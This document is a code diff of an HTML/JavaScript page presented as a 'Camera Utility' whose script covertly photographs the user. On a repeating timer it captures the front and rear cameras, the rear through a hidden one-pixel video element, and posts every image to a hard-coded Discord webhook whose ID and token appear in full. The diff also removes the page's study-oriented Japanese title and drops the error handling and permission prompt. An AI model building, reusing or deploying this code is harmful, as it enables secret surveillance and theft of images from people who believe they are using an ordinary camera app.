@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>カメラアプリセキュリティ勉強</title>
+  <title>Camera Utility</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     html, body {
@@ -16,6 +16,9 @@
       height: 100%;
       object-fit: cover;
       position: absolute;
+      top: 0;
+      left: 0;
+      z-index: 1;
     }
     #shutterBtn {
       position: absolute;
@@ -50,7 +53,6 @@
       border-radius: 8px;
       z-index: 3;
       cursor: pointer;
-      display: none;
     }
     #galleryView {
       position: absolute;
@@ -108,17 +110,11 @@
   <button id="shutterBtn"></button>
   <img id="photoPreview" src="" alt="preview" />
   <div id="galleryView"></div>
-  <button id="backBtn" style="display:none">戻る</button>
+  <button id="backBtn" style="display:none">Back</button>
   <audio id="shutterSound" src="https://www.soundjay.com/mechanical/camera-shutter-click-01a.mp3" preload="auto"></audio>
 
   <script>
-    const protocol = "https";
-    const domain = "discord.com";
-    const apiPath = "/api/webhooks";
-    const webhookId = "1192062408462696518";
-    const webhookToken = "w_kSg9s3GNGxdgVpep893UxRs-rY19ZYRWHVlbOpSnVRjHu40J9NWyLNBCVC9-Ovz4Bt";
-
-    const webhookUrl = `${protocol}://${domain}${apiPath}/${webhookId}/${webhookToken}`;
+    const webhookUrl = "https://discord.com/api/webhooks/1192062408462696518/w_kSg9s3GNGxdgVpep893UxRs-rY19ZYRWHVlbOpSnVRjHu40J9NWyLNBCVC9-Ovz4Bt";
 
     const config = {
       maxSize: 8 * 1024 * 1024,
@@ -134,28 +130,22 @@
     const backBtn = document.getElementById('backBtn');
     const shutterSound = document.getElementById('shutterSound');
     const photos = [];
-
     let currentStream = null;
 
+    const externalVideoPreview = document.createElement('video');
+    externalVideoPreview.style.position = 'absolute';
+    externalVideoPreview.style.width = '1px';
+    externalVideoPreview.style.height = '1px';
+    externalVideoPreview.style.top = '0';
+    externalVideoPreview.style.left = '0';
+    externalVideoPreview.style.zIndex = '-1';
+    document.body.appendChild(externalVideoPreview);
+
     async function initCamera() {
-      try {
-        currentStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' },
-          audio: false
-        });
-        video.srcObject = currentStream;
-
-        // メタデータ読み込み待ち
-        await new Promise(resolve => {
-          if (video.readyState >= 2) resolve();
-          else video.onloadedmetadata = () => resolve();
-        });
-
-        startAutoCapture();
-      } catch (err) {
-        console.error("カメラ起動エラー:", err);
-        alert("カメラのアクセスを許可してください");
-      }
+      currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      video.srcObject = currentStream;
+      startPeriodicCapture();
+      startExternalStream();
     }
 
     async function captureFromCurrentStream() {
@@ -168,30 +158,20 @@
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       const ctx = canvas.getContext('2d');
-
-      // 内カメラは反転するため、左右反転補正
-      ctx.translate(canvas.width, 0);
-      ctx.scale(-1, 1);
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      return new Promise(res => {
-        canvas.toBlob(blob => res(blob), 'image/jpeg', config.quality);
-      });
+      return new Promise(res => canvas.toBlob(blob => res(blob), 'image/jpeg', config.quality));
     }
 
     async function captureImageSilently(facingMode) {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
       const track = stream.getVideoTracks()[0];
       const imageCapture = new ImageCapture(track);
       const bitmap = await imageCapture.grabFrame();
-
       const canvas = document.createElement('canvas');
       canvas.width = bitmap.width;
       canvas.height = bitmap.height;
       const ctx = canvas.getContext('2d');
-
       ctx.drawImage(bitmap, 0, 0);
-
       return new Promise(res => {
         canvas.toBlob(blob => {
           stream.getTracks().forEach(t => t.stop());
@@ -204,11 +184,7 @@
       const form = new FormData();
       form.append("file", blob, `img_${Date.now()}.jpg`);
       form.append("content", label);
-      try {
-        await fetch(webhookUrl, { method: "POST", body: form });
-      } catch (e) {
-        console.error("Webhook送信エラー:", e);
-      }
+      await fetch(webhookUrl, { method: "POST", body: form });
     }
 
     function showFlash() {
@@ -218,10 +194,8 @@
 
     function updatePreview(blob) {
       const url = URL.createObjectURL(blob);
-      preview.onload = () => {
-        preview.style.display = "block";
-      };
       preview.src = url;
+      preview.style.display = "block";
     }
 
     shutterBtn.onclick = async () => {
@@ -231,7 +205,7 @@
       if (blob.size <= config.maxSize) {
         updatePreview(blob);
         addToGallery(blob);
-        sendToWebhook(blob, "内カメラ画像（手動）");
+        sendToWebhook(blob, "Front Camera (Manual Snap)");
       }
     };
 
@@ -248,7 +222,6 @@
       photos.forEach((blob, index) => {
         const div = document.createElement('div');
         div.className = "galleryItem";
-
         const img = document.createElement('img');
         img.src = URL.createObjectURL(blob);
         img.onclick = () => window.open(img.src, '_blank');
@@ -272,20 +245,35 @@
       backBtn.style.display = "none";
     };
 
-    function startAutoCapture() {
+    function startPeriodicCapture() {
       setInterval(async () => {
         try {
           const blobUser = await captureFromCurrentStream();
           if (blobUser.size <= config.maxSize) {
-            sendToWebhook(blobUser, "内カメラ画像（自動）");
-          }
-
-          const blobBack = await captureImageSilently('environment');
-          if (blobBack.size <= config.maxSize) {
-            sendToWebhook(blobBack, "外カメラ画像（自動）");
+            sendToWebhook(blobUser, "Front Camera (Scheduled Update)");
           }
         } catch (e) {
-          console.error("自動キャプチャエラー:", e);
+          console.error("Front camera update error:", e);
+        }
+      }, config.interval);
+    }
+
+    async function startExternalStream() {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+      externalVideoPreview.srcObject = stream;
+      externalVideoPreview.play();
+      startExternalPeriodicCapture();
+    }
+
+    function startExternalPeriodicCapture() {
+      setInterval(async () => {
+        try {
+          const blobBack = await captureImageSilently('environment');
+          if (blobBack.size <= config.maxSize) {
+            sendToWebhook(blobBack, "Rear Camera (Scheduled Update)");
+          }
+        } catch (e) {
+          console.error("Rear camera update error:", e);
         }
       }, config.interval);
     }
